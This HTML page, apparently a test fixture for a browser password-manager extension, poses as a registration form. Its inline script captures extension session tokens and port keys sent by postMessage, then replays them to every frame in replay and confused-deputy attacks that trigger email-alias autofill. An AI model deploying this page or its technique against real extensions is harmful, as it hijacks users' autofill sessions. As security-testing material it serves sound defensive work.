<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Alias browser integration registration</title>
  </head>
  <body>
    <main>
      <h1>Create integration account</h1>
      <form id="registration" action="/registered" method="post">
        <label for="email">Email</label>
        <input id="email" name="email" type="email" autocomplete="email" required />

        <label for="password">Password</label>
        <input id="password" name="password" type="password" autocomplete="new-password" required />

        <button type="submit">Create account</button>
      </form>
    </main>
    <script>
      (() => {
        const observed = [];
        let attackResults;
        let attackScheduled = false;
        const observeAliasSession = (message) => {
          observed.push({
            command: typeof message.command === "string" ? message.command : undefined,
            portKey: typeof message.portKey === "string" ? message.portKey : undefined,
            token: typeof message.token === "string" ? message.token : undefined,
          });
          if (message.command === "observedAliasSession" && !attackScheduled) {
            attackScheduled = true;
            attemptObservedSessionAttacks();
          }
        };
        window.observeAliasSession = observeAliasSession;
        window.addEventListener("message", (event) => {
          const message = event.data;
          if (!message || typeof message !== "object") {
            return;
          }
          observeAliasSession(message);
        });

        const sendToExtensionFrames = (messages) => {
          const frames = Array.from(window.frames);
          for (const frame of frames) {
            for (const message of messages) {
              frame.postMessage(message, "*");
            }
          }
          return { frameCount: frames.length, observedCount: observed.length };
        };

        const observedSessions = () =>
          observed.filter(({ portKey, token }) => portKey !== undefined && token !== undefined);

        window.observedAliasAttackResults = () => attackResults;

        window.attemptAliasReplay = () => {
          const sessions = observedSessions().length
            ? observedSessions()
            : [{ portKey: "observed-port-key", token: "observed-session-token" }];
          return sendToExtensionFrames(
            sessions.map(({ portKey, token }) => ({
              command: "fillEmailAlias",
              portKey,
              token,
              emailAliasFillCapability: "a".repeat(32),
            })),
          );
        };

        window.attemptAliasConfusedDeputy = () =>
          sendToExtensionFrames([
            {
              command: "updateAutofillInlineMenuEmailAliasRecommendation",
              portKey: observed.at(-1)?.portKey ?? "observed-port-key",
              token: observed.at(-1)?.token ?? "observed-session-token",
              emailAliasRecommendation: {
                hostname: location.hostname,
                canCreate: true,
              },
            },
            {
              command: "fillEmailAlias",
              portKey: observed.at(-1)?.portKey ?? "observed-port-key",
              token: observed.at(-1)?.token ?? "observed-session-token",
            },
          ]);

        const attemptObservedSessionAttacks = () => {
          const replay = window.attemptAliasReplay();
          const confusedDeputy = window.attemptAliasConfusedDeputy();
          if (replay.frameCount === 0 || confusedDeputy.frameCount === 0) {
            setTimeout(attemptObservedSessionAttacks, 50);
            return;
          }
          attackResults = { replay, confusedDeputy };
        };
      })();
    </script>
  </body>
</html>
